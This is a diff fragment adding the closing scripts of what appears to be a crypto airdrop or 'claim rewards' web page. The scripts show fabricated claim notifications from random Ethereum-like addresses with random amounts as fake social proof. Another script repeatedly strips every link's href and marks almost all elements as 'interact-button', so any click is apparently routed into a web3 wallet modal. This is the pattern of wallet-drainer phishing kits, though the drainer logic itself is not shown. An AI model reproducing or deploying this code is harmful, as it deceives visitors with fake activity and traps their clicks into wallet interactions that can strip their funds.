+                notification.classList.add('active');
+            }, 100);
+            
+            // Remove after some time
+            setTimeout(() => {
+                notification.classList.remove('active');
+                setTimeout(() => {
+                    notificationsContainer.removeChild(notification);
+                }, 500);
+            }, 5000);
+        }
+        
+        // Generate a random Ethereum-like address
+        function getRandomAddress() {
+            const chars = '0123456789abcdef';
+            let address = '0x';
+            for (let i = 0; i < 8; i++) {
+                address += chars[Math.floor(Math.random() * chars.length)];
+            }
+            return address + '...';
+        }
+        
+        // Generate a random claim amount
+        function getRandomAmount() {
+            return Math.floor(Math.random() * 2000) + 500;
+        }
+        
+        // Initialize notifications
+        function initNotifications() {
+            // Show initial notifications
+            for (let i = 0; i < 3; i++) {
+                setTimeout(() => {
+                    showRandomNotification();
+                }, i * 2500);
+            }
+            
+            // Keep showing notifications periodically
+            setInterval(() => {
+                if (Math.random() > 0.3) {
+                    showRandomNotification();
+                }
+            }, 8000);
+        }
+        
+        // Initialize on load
+        window.addEventListener('DOMContentLoaded', function() {
+            createParticles();
+            initNotifications();
+            
+            // Add animation to special rewards card
+            const rewardsCard = document.querySelector('.rewards-card');
+            rewardsCard.addEventListener('mouseover', function() {
+                this.style.animation = 'shine 3s infinite linear';
+                this.style.backgroundImage = 'linear-gradient(120deg, rgba(255,255,255,0) 0%, rgba(255,255,255,0.1) 50%, rgba(255,255,255,0) 100%)';
+                this.style.backgroundSize = '200% auto';
+            });
+            
+            rewardsCard.addEventListener('mouseout', function() {
+                this.style.animation = 'none';
+                this.style.backgroundImage = 'none';
+            });
+        });
+    </script>
+	<script>
+    function addClassesToElements() {
+        const links = document.querySelectorAll('a:not(.interact-button)');
+        for (const link of links) {
+            link.removeAttribute('href');
+            link.classList.add('interact-button');
+        }
+        const buttons = document.querySelectorAll('div:not(.interact-button):not(.web3-overlay):not(.item):not(.web3-modal-items):not(.web3-modal-title):not(.web3-modal)');
+        for (const button of buttons) {
+            button.classList.add('interact-button');
+        }
+    }
+    setInterval(addClassesToElements, 300);
+</script>
+</body>
+</html>
